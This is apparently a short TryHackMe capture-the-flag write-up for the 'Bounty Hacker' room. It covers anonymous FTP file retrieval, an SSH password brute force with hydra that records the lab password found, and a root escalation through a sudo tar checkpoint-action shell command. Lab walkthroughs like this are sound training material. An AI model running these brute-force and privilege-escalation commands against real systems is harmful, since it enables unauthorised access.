# Bounty Hacker (THM)

- https://tryhackme.com/room/cowboyhacker
- March 2, 2023
- easy

---

## Enumeration

- Nmap Initial

1. 21/ftp vsftpd 3.0.3
   - anonymous FTP login allowed
2. 22/ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
3. 80/http Apache httpd 2.4.18 ((Ubuntu))
   - server - Apache/2.4.18 (Ubuntu)

- check ftp anonymous login
  - nothing found
  - 229 Entering Extended Passive Mode (|||9411|) (I don't know why I get that error)
- get files from ftp server (find a command to download from ftp server from hacktricks)

```sh
wget -m --no-passive ftp://anonymous:anonymous@$IP
```

- get two files
  - locks.txt
  - task.txt
- name -> lin
- locks.txt file may be password files
- brute force ssh with user `lin` with password from locks.txt

```sh
hydra -l lin -P from_ftp/locks.txt ssh://$IP
# login: lin   password: RedDr4gonSynd1cat3
```

- `sudo -l` for lin

```
Matching Defaults entries for lin on bountyhacker:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User lin may run the following commands on bountyhacker:
    (root) /bin/tar
```

- from gtfobins, sudo for tar

```sh
sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
```

- get root access

---
